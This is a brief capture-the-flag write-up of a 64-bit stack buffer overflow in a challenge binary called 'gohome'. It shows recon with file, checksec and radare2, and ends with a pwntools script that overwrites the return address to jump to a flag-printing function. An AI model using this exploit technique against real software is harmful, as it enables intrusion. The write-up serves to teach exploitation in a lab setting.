1. use `file <file>` to take a look. It's a ELF file, not stripped.
```bash
$ file gohome
gohome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=63cc39d0f4f93acc2ee50813f4f82c8ed43d9135, not stripped
```

2.use `gdb-peda checksec` to make sure whether it have protection of the program. by the result, we know that only NX protection is open.
![Image](https://i.imgur.com/YsoMUcS.png) 


3. `r2 <file>`, `aa`, `afl`, there's some function we can pay attention to. 
![Image](https://i.imgur.com/EFXiT2J.png)


4. first, `s main`, `VV` to take a look.
![Image](https://i.imgur.com/9eNQ6Rq.png)

5. by the code, we know that the program will exit after gets function get our user input. And our input will be put at **var_20h(rpb-0x20)**. Let's go back to see Billyhouse function.

![Image](https://i.imgur.com/RISfNKD.png)

1. we notice that this program will print flag which we want to get. So, what we need to do is to let the program jump here to run this function.

2. count to overwrite the stack and rbp address until the return address. we need to BOF all of them, put the Billyhouse function address to the return address. Bellow is our exploit script.

```python
from pwn import *

r = process('./gohome')
#r = remote('120.114.62.211', 6126)

payload = b'A'*40

r.sendline(payload + p64(0x004006c6))  #if 64 bit ,or 32bit use p32

r.interactive()
```

8. run the program and we can get the flag.